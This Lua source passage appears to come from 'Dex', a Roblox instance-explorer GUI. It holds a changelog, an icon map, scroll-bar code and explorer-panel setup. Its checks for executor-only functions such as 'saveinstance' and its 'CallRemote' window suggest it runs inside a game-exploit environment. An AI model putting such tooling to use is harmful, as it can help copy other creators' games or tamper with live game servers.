		Whether objects can be selected.

		If Modifiable is false, then left-clicking will perform a drag
		selection.

## Updates

- 2013-09-18
	- Fixed explorer icons to match studio explorer.

- 2013-09-14
	- Added GetOption and SetOption bindables.
		- Option: Modifiable; sets whether objects can be modified by the panel.
		- Option: Selectable; sets whether objects can be selected.
	- Slight modification to left-click selection behavior.
	- Improved layout and scaling.

- 2013-09-13
	- Added drag to reparent objects.
		- Left-click to select/deselect object.
		- Left-click and drag unselected object to reparent single object.
		- Left-click and drag selected object to move reparent entire selection.
		- Right-click while dragging to cancel.

- 2013-09-11
	- Added explorer panel header with actions.
		- Added Cut action.
		- Added Copy action.
		- Added Paste action.
		- Added Delete action.
	- Added drag selection.
		- Left-click: Add to selection on drag.
		- Right-click: Add to or remove from selection on drag.
	- Ensured SelectionChanged fires only when the selection actually changes.
	- Added documentation and change log.
	- Fixed thread issue.

- 2013-09-09
	- Added basic multi-selection.
		- Left-click to set selection.
		- Right-click to add to or remove from selection.
	- Removed "Selection" ObjectValue.
		- Added GetSelection BindableFunction.
		- Added SetSelection BindableFunction.
		- Added SelectionChanged BindableEvent.
	- Changed font to SourceSans.

- 2013-08-31
	- Improved GUI sizing based off of `GUI_SIZE` constant.
	- Automatic font size detection.

- 2013-08-27
	- Initial explorer panel.


## Todo

- Sorting
	- by ExplorerOrder
	- by children
	- by name
- Drag objects to reparent

]]

local ENTRY_SIZE = GUI_SIZE + ENTRY_PADDING*2
local ENTRY_BOUND = ENTRY_SIZE + ENTRY_MARGIN
local HEADER_SIZE = ENTRY_SIZE*2

local FONT = 'SourceSans'
local FONT_SIZE do
	local size = {8,9,10,11,12,14,18,24,36,48}
	local s
	local n = math.huge
	for i = 1,#size do
		if size[i] <= GUI_SIZE then
			FONT_SIZE = i - 1
		end
	end
end

local GuiColor = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 96/255, 140/255, 211/255);
	BorderSelected  = Color3.new( 86/255, 125/255, 188/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Icon map constants

local MAP_ID = 483448923

-- Indices based on implementation of Icon function.
local ACTION_CUT         	 = 160
local ACTION_COPY        	 = 161
local ACTION_PASTE       	 = 162
local ACTION_DELETE      	 = 163
local ACTION_SORT        	 = 164
local ACTION_CUT_OVER    	 = 174
local ACTION_COPY_OVER   	 = 175
local ACTION_PASTE_OVER  	 = 176
local ACTION_DELETE_OVER	 = 177
local ACTION_SORT_OVER  	 = 178
local ACTION_EDITQUICKACCESS = 190
local ACTION_FREEZE 		 = 188
local ACTION_STARRED 		 = 189
local ACTION_ADDSTAR 		 = 184
local ACTION_ADDSTAR_OVER 	 = 187

local NODE_COLLAPSED      = 165
local NODE_EXPANDED       = 166
local NODE_COLLAPSED_OVER = 179
local NODE_EXPANDED_OVER  = 180

local ExplorerIndex = {
	["Accessory"] = 32;
	["Accoutrement"] = 32;
	["AdService"] = 73;
	["Animation"] = 60;
	["AnimationController"] = 60;
	["AnimationTrack"] = 60;
	["Animator"] = 60;
	["ArcHandles"] = 56;
	["AssetService"] = 72;
	["Attachment"] = 34;
	["Backpack"] = 20;
	["BadgeService"] = 75;
	["BallSocketConstraint"] = 89;
	["BillboardGui"] = 64;
	["BinaryStringValue"] = 4;
	["BindableEvent"] = 67;
	["BindableFunction"] = 66;
	["BlockMesh"] = 8;
	["BloomEffect"] = 90;
	["BlurEffect"] = 90;
	["BodyAngularVelocity"] = 14;
	["BodyForce"] = 14;
	["BodyGyro"] = 14;
	["BodyPosition"] = 14;
	["BodyThrust"] = 14;
	["BodyVelocity"] = 14;
	["BoolValue"] = 4;
	["BoxHandleAdornment"] = 54;
	["BrickColorValue"] = 4;
	["Camera"] = 5;
	["CFrameValue"] = 4;
	["CharacterMesh"] = 60;
	["Chat"] = 33;
	["ClickDetector"] = 41;
	["CollectionService"] = 30;
	["Color3Value"] = 4;
	["ColorCorrectionEffect"] = 90;
	["ConeHandleAdornment"] = 54;
	["Configuration"] = 58;
	["ContentProvider"] = 72;
	["ContextActionService"] = 41;
	["CoreGui"] = 46;
	["CoreScript"] = 18;
	["CornerWedgePart"] = 1;
	["CustomEvent"] = 4;
	["CustomEventReceiver"] = 4;
	["CylinderHandleAdornment"] = 54;
	["CylinderMesh"] = 8;
	["CylindricalConstraint"] = 89;
	["Debris"] = 30;
	["Decal"] = 7;
	["Dialog"] = 62;
	["DialogChoice"] = 63;
	["DoubleConstrainedValue"] = 4;
	["Explosion"] = 36;
	["FileMesh"] = 8;
	["Fire"] = 61;
	["Flag"] = 38;
	["FlagStand"] = 39;
	["FloorWire"] = 4;
	["Folder"] = 70;
	["ForceField"] = 37;
	["Frame"] = 48;
	["GamePassService"] = 19;
	["Glue"] = 34;
	["GuiButton"] = 52;
	["GuiMain"] = 47;
	["GuiService"] = 47;
	["Handles"] = 53;
	["HapticService"] = 84;
	["Hat"] = 45;
	["HingeConstraint"] = 89;
	["Hint"] = 33;
	["HopperBin"] = 22;
	["HttpService"] = 76;
	["Humanoid"] = 9;
	["ImageButton"] = 52;
	["ImageLabel"] = 49;
	["InsertService"] = 72;
	["IntConstrainedValue"] = 4;
	["IntValue"] = 4;
	["JointInstance"] = 34;
	["JointsService"] = 34;
	["Keyframe"] = 60;
	["KeyframeSequence"] = 60;
	["KeyframeSequenceProvider"] = 60;
	["Lighting"] = 13;
	["LineHandleAdornment"] = 54;
	["LocalScript"] = 18;
	["LogService"] = 87;
	["MarketplaceService"] = 46;
	["Message"] = 33;
	["Model"] = 2;
	["ModuleScript"] = 71;
	["Motor"] = 34;
	["Motor6D"] = 34;
	["MoveToConstraint"] = 89;
	["NegateOperation"] = 78;
	["NetworkClient"] = 16;
	["NetworkReplicator"] = 29;
	["NetworkServer"] = 15;
	["NumberValue"] = 4;
	["ObjectValue"] = 4;
	["Pants"] = 44;
	["ParallelRampPart"] = 1;
	["Part"] = 1;
	["ParticleEmitter"] = 69;
	["PartPairLasso"] = 57;
	["PathfindingService"] = 37;
	["Platform"] = 35;
	["Player"] = 12;
	["PlayerGui"] = 46;
	["Players"] = 21;
	["PlayerScripts"] = 82;
	["PointLight"] = 13;
	["PointsService"] = 83;
	["Pose"] = 60;
	["PrismaticConstraint"] = 89;
	["PrismPart"] = 1;
	["PyramidPart"] = 1;
	["RayValue"] = 4;
	["ReflectionMetadata"] = 86;
	["ReflectionMetadataCallbacks"] = 86;
	["ReflectionMetadataClass"] = 86;
	["ReflectionMetadataClasses"] = 86;
	["ReflectionMetadataEnum"] = 86;
	["ReflectionMetadataEnumItem"] = 86;
	["ReflectionMetadataEnums"] = 86;
	["ReflectionMetadataEvents"] = 86;
	["ReflectionMetadataFunctions"] = 86;
	["ReflectionMetadataMember"] = 86;
	["ReflectionMetadataProperties"] = 86;
	["ReflectionMetadataYieldFunctions"] = 86;
	["RemoteEvent"] = 80;
	["RemoteFunction"] = 79;
	["ReplicatedFirst"] = 72;
	["ReplicatedStorage"] = 72;
	["RightAngleRampPart"] = 1;
	["RocketPropulsion"] = 14;
	["RodConstraint"] = 89;
	["RopeConstraint"] = 89;
	["Rotate"] = 34;
	["RotateP"] = 34;
	["RotateV"] = 34;
	["RunService"] = 66;
	["ScreenGui"] = 47;
	["Script"] = 6;
	["ScrollingFrame"] = 48;
	["Seat"] = 35;
	["Selection"] = 55;
	["SelectionBox"] = 54;
	["SelectionPartLasso"] = 57;
	["SelectionPointLasso"] = 57;
	["SelectionSphere"] = 54;
	["ServerScriptService"] = 0;
	["ServerStorage"] = 74;
	["Shirt"] = 43;
	["ShirtGraphic"] = 40;
	["SkateboardPlatform"] = 35;
	["Sky"] = 28;
	["SlidingBallConstraint"] = 89;
	["Smoke"] = 59;
	["Snap"] = 34;
	["Sound"] = 11;
	["SoundService"] = 31;
	["Sparkles"] = 42;
	["SpawnLocation"] = 25;
	["SpecialMesh"] = 8;
	["SphereHandleAdornment"] = 54;
	["SpotLight"] = 13;
	["SpringConstraint"] = 89;
	["StarterCharacterScripts"] = 82;
	["StarterGear"] = 20;
	["StarterGui"] = 46;
	["StarterPack"] = 20;
	["StarterPlayer"] = 88;
	["StarterPlayerScripts"] = 82;
	["Status"] = 2;
	["StringValue"] = 4;
	["SunRaysEffect"] = 90;
	["SurfaceGui"] = 64;
	["SurfaceLight"] = 13;
	["SurfaceSelection"] = 55;
	["Team"] = 24;
	["Teams"] = 23;
	["TeleportService"] = 81;
	["Terrain"] = 65;
	["TerrainRegion"] = 65;
	["TestService"] = 68;
	["TextBox"] = 51;
	["TextButton"] = 51;
	["TextLabel"] = 50;
	["Texture"] = 10;
	["TextureTrail"] = 4;
	["Tool"] = 17;
	["TouchTransmitter"] = 37;
	["TrussPart"] = 1;
	["UnionOperation"] = 77;
	["UserInputService"] = 84;
	["Vector3Value"] = 4;
	["VehicleSeat"] = 35;
	["VelocityMotor"] = 34;
	["WedgePart"] = 1;
	["Weld"] = 34;
	["Workspace"] = 19;
}

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------

function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end

local barActive = false
local activeOptions = {}

function createDDown(dBut, callback,...)
	if barActive then
		for i,v in pairs(activeOptions) do
			v:Destroy()
		end
		activeOptions = {}
		barActive = false
		return
	else
		barActive = true
	end
	local slots = {...}
	local base = dBut
	for i,v in pairs(slots) do
		local newOption = base:Clone()
		newOption.ZIndex = 5
		newOption.Name = "Option "..tostring(i)
		newOption.Parent = base.Parent.Parent.Parent
		newOption.BackgroundTransparency = 0
		newOption.ZIndex = 2
		table.insert(activeOptions,newOption)
		newOption.Position = UDim2.new(-0.4, dBut.Position.X.Offset, dBut.Position.Y.Scale, dBut.Position.Y.Offset + (#activeOptions * dBut.Size.Y.Offset))
		newOption.Text = slots[i]
		newOption.MouseButton1Down:connect(function()
			dBut.Text = slots[i]
			callback(slots[i])
			for i,v in pairs(activeOptions) do
				v:Destroy()
			end
			activeOptions = {}
			barActive = false
		end)
	end
end

-- Connects a function to an event such that it fires asynchronously
function Connect(event,func)
	return event:connect(function(...)
		local a = {...}
		spawn(function() func(unpack(a)) end)
	end)
end

-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end

do
	local ZIndexLock = {}
	-- Sets the ZIndex of an object and its descendants. Objects are locked so
	-- that SetZIndexOnChanged doesn't spawn multiple threads that set the
	-- ZIndex of the same object.
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end

	function SetZIndexOnChanged(object)
		return object.Changed:connect(function(p)
			if p == "ZIndex" then
				SetZIndex(object,object.ZIndex)
			end
		end)
	end
end

---- IconMap ----
-- Image size: 256px x 256px
-- Icon size: 16px x 16px
-- Padding between each icon: 2px
-- Padding around image edge: 1px
-- Total icons: 14 x 14 (196)
local Icon do
	local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
	game:GetService('ContentProvider'):Preload(iconMap)
	local iconDehash do
		-- 14 x 14, 0-based input, 0-based output
		local f=math.floor
		function iconDehash(h)
			return f(h/14%14),f(h%14)
		end
	end

	function Icon(IconFrame,index)
		local row,col = iconDehash(index)
		local mapSize = Vector2.new(256,256)
		local pad,border = 2,1
		local iconSize = 16

		local class = 'Frame'
		if type(IconFrame) == 'string' then
			class = IconFrame
			IconFrame = nil
		end

		if not IconFrame then
			IconFrame = Create(class,{
				Name = "Icon";
				BackgroundTransparency = 1;
				ClipsDescendants = true;
				Create('ImageLabel',{
					Name = "IconMap";
					Active = false;
					BackgroundTransparency = 1;
					Image = iconMap;
					Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
				});
			})
		end

		IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
		return IconFrame
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- ScrollBar
do
	-- AutoButtonColor doesn't always reset properly
	local function ResetButtonColor(button)
		local active = button.Active
		button.Active = not active
		button.Active = active
	end

	local function ArrowGraphic(size,dir,scaled,template)
		local Frame = Create('Frame',{
			Name = "Arrow Graphic";
			BorderSizePixel = 0;
			Size = UDim2.new(0,size,0,size);
			Transparency = 1;
		})
		if not template then
			template = Instance.new("Frame")
			template.BorderSizePixel = 0
		end

		local transform
		if dir == nil or dir == 'Up' then
			function transform(p,s) return p,s end
		elseif dir == 'Down' then
			function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
		elseif dir == 'Left' then
			function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
		elseif dir == 'Right' then
			function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
		end

		local scale
		if scaled then
			function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
		else
			function scale(p,s) return p,s end
		end

		local o = math.floor(size/4)
		if size%2 == 0 then
			local n = size/2-1
			for i = 0,n do
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,n-i,0,o+i),
					UDim2.new(0,(i+1)*2,0,1)
				))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
		else
			local n = (size-1)/2
			for i = 0,n do
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,n-i,0,o+i),
					UDim2.new(0,i*2+1,0,1)
				))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
		end
		if size%4 > 1 then
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,0,0,size-o-1),
				UDim2.new(0,size,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
		return Frame
	end


	local function GripGraphic(size,dir,spacing,scaled,template)
		local Frame = Create('Frame',{
			Name = "Grip Graphic";
			BorderSizePixel = 0;
			Size = UDim2.new(0,size.x,0,size.y);
			Transparency = 1;
		})
		if not template then
			template = Instance.new("Frame")
			template.BorderSizePixel = 0
		end

		spacing = spacing or 2

		local scale
		if scaled then
			function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
		else
			function scale(p) return p end
		end

		if dir == 'Vertical' then
			for i=0,size.x-1,spacing do
				local t = template:Clone()
				t.Size = scale(UDim2.new(0,1,0,size.y))
				t.Position = scale(UDim2.new(0,i,0,0))
				t.Parent = Frame
			end
		elseif dir == nil or dir == 'Horizontal' then
			for i=0,size.y-1,spacing do
				local t = template:Clone()
				t.Size = scale(UDim2.new(0,size.x,0,1))
				t.Position = scale(UDim2.new(0,0,0,i))
				t.Parent = Frame
			end
		end

		return Frame
	end

	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-GUI_SIZE) or UDim2.new(1,-GUI_SIZE,0,0);
			Size = horizontal and UDim2.new(1,0,0,GUI_SIZE) or UDim2.new(0,GUI_SIZE,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-GUI_SIZE,0,0) or UDim2.new(0,0,1,-GUI_SIZE);
				Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
				BackgroundColor3 = GuiColor.Button;
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
				BackgroundColor3 = GuiColor.Button;
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-GUI_SIZE*2,1,0) or UDim2.new(1,0,1,-GUI_SIZE*2);
				Position = horizontal and UDim2.new(0,GUI_SIZE,0,0) or UDim2.new(0,0,0,GUI_SIZE);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
					BackgroundColor3 = GuiColor.Button;
					BorderColor3 = GuiColor.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = GuiColor.Border;
		})
		local graphicSize = GUI_SIZE/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = GUI_SIZE*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,GUI_SIZE)
				if ScrollThumbFrame.AbsoluteSize.x < GUI_SIZE then
					ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < GUI_SIZE then
					ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Explorer panel

local explorerPanel = D_E_X.ExplorerPanel
Create(explorerPanel,{
	BackgroundColor3 = GuiColor.Field;
	BorderColor3 = GuiColor.Border;
	Active = true;
})

local SettingsRemote = explorerPanel.Parent:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")
local GetApiRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetApi")
local GetAwaitRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetAwaiting")
local bindSetAwaiting = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("SetAwaiting")

local SaveInstanceWindow = explorerPanel.Parent:WaitForChild("SaveInstance")
local ConfirmationWindow = explorerPanel.Parent:WaitForChild("Confirmation")
local CautionWindow = explorerPanel.Parent:WaitForChild("Caution")
local TableCautionWindow = explorerPanel.Parent:WaitForChild("TableCaution")

local RemoteWindow = explorerPanel.Parent:WaitForChild("CallRemote")

local ScriptEditor = explorerPanel.Parent:WaitForChild("ScriptEditor")
local ScriptEditorEvent = ScriptEditor:WaitForChild("OpenScript")

local CurrentSaveInstanceWindow
local CurrentRemoteWindow

local lastSelectedNode

local DexStorage
local DexStorageMain
local DexStorageEnabled

if saveinstance then DexStorageEnabled = true end

if DexStorageEnabled then
	DexStorage = Instance.new("Folder")
	DexStorage.Name = "Dex"
	DexStorageMain = Instance.new("Folder",DexStorage)
	DexStorageMain.Name = "DexStorage"
end

local NilStorage
local NilStorageMain
local NilStorageEnabled

if get_nil_instances and IfThisFunctionWasStableEnough then NilStorageEnabled = true end

if NilStorageEnabled then
	NilStorage = Instance.new("Folder")
	NilStorage.Name = "Dex Internal Storage"
	NilStorageMain = Instance.new("Folder",NilStorage)
	NilStorageMain.Name = "Nil Instances"
end

local listFrame = Create('Frame',{
	Name = "List";
	BackgroundTransparency = 1;
	ClipsDescendants = true;
